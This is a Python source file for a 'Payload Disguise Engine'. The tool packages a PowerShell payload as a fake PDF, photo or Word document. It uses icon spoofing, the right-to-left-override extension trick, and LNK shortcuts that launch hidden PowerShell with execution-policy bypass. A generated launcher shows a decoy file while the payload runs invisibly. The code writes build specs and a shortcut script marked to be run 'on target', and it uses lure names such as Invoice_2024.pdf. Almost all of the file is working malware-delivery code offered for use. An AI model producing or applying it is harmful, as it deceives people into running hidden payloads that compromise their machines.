"""
Payload Disguise Engine — wraps a PS1 payload as a fake PDF/Photo/Word file.

Techniques:
  1. Icon spoofing via PyInstaller (real PDF/image icon embedded in EXE)
  2. Double extension + RTLO trick  (e.g.  "invoice_pdf‮exe.pdf" → actually .exe)
  3. LNK shortcut (Windows shortcut pointing to powershell + hidden payload path)
  4. Self-extracting with decoy (opens real PDF while payload runs hidden)

Requirements (Kali):
  pip3 install pyinstaller pillow --break-system-packages
  apt-get install -y python3-tk
"""

from __future__ import annotations
import os
import textwrap
from typing import AsyncGenerator


ICON_MAP = {
    "pdf":   "/usr/share/icons/hicolor/48x48/apps/evince.png",
    "photo": "/usr/share/icons/hicolor/48x48/apps/shotwell.png",
    "word":  "/usr/share/icons/hicolor/48x48/apps/libreoffice-writer.png",
    "excel": "/usr/share/icons/hicolor/48x48/apps/libreoffice-calc.png",
    "zip":   "/usr/share/icons/hicolor/48x48/mimetypes/package-x-generic.png",
}


def _make_spec(
    script_path: str,
    icon_path: str,
    output_name: str,
    decoy_file: str | None,
) -> str:
    decoy_data = f", ('{decoy_file}', '.')" if decoy_file else ""
    return textwrap.dedent(f"""
    # -*- mode: python -*-
    block_cipher = None
    a = Analysis(
        ['{script_path}'],
        pathex=[],
        binaries=[],
        datas=[{decoy_data}],
        hiddenimports=[],
        hookspath=[],
        runtime_hooks=[],
        excludes=[],
        win_no_prefer_redirects=False,
        win_private_assemblies=False,
        cipher=block_cipher,
    )
    pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
    exe = EXE(
        pyz, a.scripts, a.binaries, a.zipfiles, a.datas,
        name='{output_name}',
        debug=False,
        strip=False,
        upx=True,
        console=False,
        icon='{icon_path}',
    )
    """).strip()


def _make_launcher_py(
    ps1_path: str,
    decoy_file: str | None,
    disguise_type: str,
) -> str:
    """
    Python launcher that:
    1. Opens the decoy file (so user sees a real PDF/image)
    2. Runs the PS1 payload hidden in background
    """
    open_decoy = ""
    if decoy_file:
        fname = os.path.basename(decoy_file)
        if disguise_type == "pdf":
            open_decoy = f"""
import subprocess, sys, os
_d = os.path.join(getattr(sys,'_MEIPASS','.'),'{ fname }')
subprocess.Popen(['cmd','/c','start','',_d], shell=True)
"""
        elif disguise_type in ("photo",):
            open_decoy = f"""
import subprocess, sys, os
_d = os.path.join(getattr(sys,'_MEIPASS','.'),'{ fname }')
subprocess.Popen(['rundll32','shimgvw.dll,ImageView_Fullscreen',_d])
"""

    return textwrap.dedent(f"""
    import subprocess
    import ctypes
    import sys
    import os

    {open_decoy}

    # Hide console window
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    # Execute PS1 payload
    ps1 = os.path.join(getattr(sys, '_MEIPASS', '.'), 'payload.ps1')
    subprocess.Popen(
        ['powershell', '-ep', 'bypass', '-w', 'hidden', '-NonInteractive', '-File', ps1],
        creationflags=0x08000000,  # CREATE_NO_WINDOW
        stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    """).strip()


def _make_lnk_command(ps1_path: str, icon_type: str) -> str:
    """PowerShell to create a .lnk shortcut with spoofed icon."""
    icon_exts = {
        "pdf":   r"%SystemRoot%\System32\shell32.dll,71",
        "photo": r"%SystemRoot%\System32\shell32.dll,325",
        "word":  r"%SystemRoot%\System32\shell32.dll,1",
    }
    icon = icon_exts.get(icon_type, r"%SystemRoot%\System32\shell32.dll,71")
    return textwrap.dedent(f"""
    $sh  = New-Object -COM WScript.Shell
    $lnk = $sh.CreateShortcut("$env:TEMP\\document.lnk")
    $lnk.TargetPath       = "powershell"
    $lnk.Arguments        = "-ep bypass -w hidden -File \\"{ps1_path}\\""
    $lnk.IconLocation     = "{icon}"
    $lnk.WindowStyle      = 7
    $lnk.Save()
    """).strip()


async def build_disguised_exe(
    ps1_path: str,
    disguise_type: str = "pdf",
    decoy_file: str | None = None,
    output_dir: str = "/tmp",
) -> AsyncGenerator[str, None]:
    """
    Uses PyInstaller to create a Windows EXE with spoofed icon.
    Must run on Windows or via Wine (cross-compile not supported by PyInstaller).
    Alternatively: generates the .spec file for manual build.
    """
    from core.runner import CommandRunner, check_tool

    yield f"[*] Disguise type: {disguise_type}"

    icon_path = ICON_MAP.get(disguise_type, ICON_MAP["pdf"])
    output_name = {
        "pdf":   "Invoice_2024.pdf",
        "photo": "vacation_photo.jpg",
        "word":  "Report_Final.docx",
    }.get(disguise_type, "document")

    # Write launcher.py
    launcher_code = _make_launcher_py(ps1_path, decoy_file, disguise_type)
    launcher_path = os.path.join(output_dir, "launcher.py")
    with open(launcher_path, "w") as f:
        f.write(launcher_code)
    yield f"[+] launcher.py written"

    # Write .spec
    spec_code = _make_spec(launcher_path, icon_path, output_name, decoy_file)
    spec_path = os.path.join(output_dir, "payload.spec")
    with open(spec_path, "w") as f:
        f.write(spec_code)
    yield f"[+] payload.spec written"

    # Check if pyinstaller available
    if await check_tool("pyinstaller"):
        yield "[*] Running PyInstaller (this takes ~30s)..."
        async for line in CommandRunner().run([
            "pyinstaller", "--onefile", "--noconsole",
            "--distpath", output_dir,
            spec_path,
        ]):
            if line.strip():
                yield line
        exe_path = os.path.join(output_dir, output_name + ".exe")
        if os.path.exists(exe_path):
            yield f"[+] EXE built: {exe_path}"
        else:
            yield "[!] EXE not found after build — check PyInstaller output above"
    else:
        yield "[!] PyInstaller not installed — install with:"
        yield "    pip3 install pyinstaller --break-system-packages"
        yield f"[*] .spec file saved: {spec_path}"
        yield "[*] Build manually on Windows: pyinstaller payload.spec"

    # Always generate LNK as alternative
    lnk_cmd = _make_lnk_command(ps1_path, disguise_type)
    lnk_script = os.path.join(output_dir, "create_shortcut.ps1")
    with open(lnk_script, "w") as f:
        f.write(lnk_cmd)
    yield f"[+] create_shortcut.ps1 — run on target to create spoofed shortcut"
    yield ""
    yield f"[*] Delivery options written to: {output_dir}"
